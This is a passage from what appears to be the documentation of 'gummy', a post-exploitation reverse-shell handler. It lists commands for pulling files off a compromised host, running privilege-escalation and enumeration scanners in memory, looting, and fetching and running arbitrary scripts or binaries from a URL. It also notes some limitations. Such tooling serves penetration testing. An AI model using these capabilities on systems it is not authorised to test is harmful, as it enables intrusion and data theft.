download <remote> [local]    - Download file (ESC to cancel)

# Modules (💾 = in-memory, 🧹 = disk+cleanup, 💿 = disk only)
modules                      - List available modules with execution modes
run peas                     - Run LinPEAS privilege escalation scanner (💾)
run lse [-l1|-l2]            - Run Linux Smart Enumeration (💾, default: -l1)
run loot                     - Run ezpz post-exploitation script (💾)
run pspy                     - Monitor processes without root (🧹, 5min timeout)
run privesc                  - Upload multiple privesc scripts (💿, platform-aware)
run bin <url|file> [args]    - Run arbitrary binary (🧹, disk + cleanup)
run sh <url> [args]          - Run arbitrary shell script from URL (💾)

# Utility
help                         - Show command reference
clear                        - Clear screen
exit, quit                   - Exit gummy (with confirmation)
```

### Known Limitations
- Terminal resize (SIGWINCH) not yet implemented - size fixed at connection time
- No port forwarding yet (planned for Phase 4)
- Session logging captures remote output only (not local input in PTY mode)
- Remote path completion in readline is placeholder only
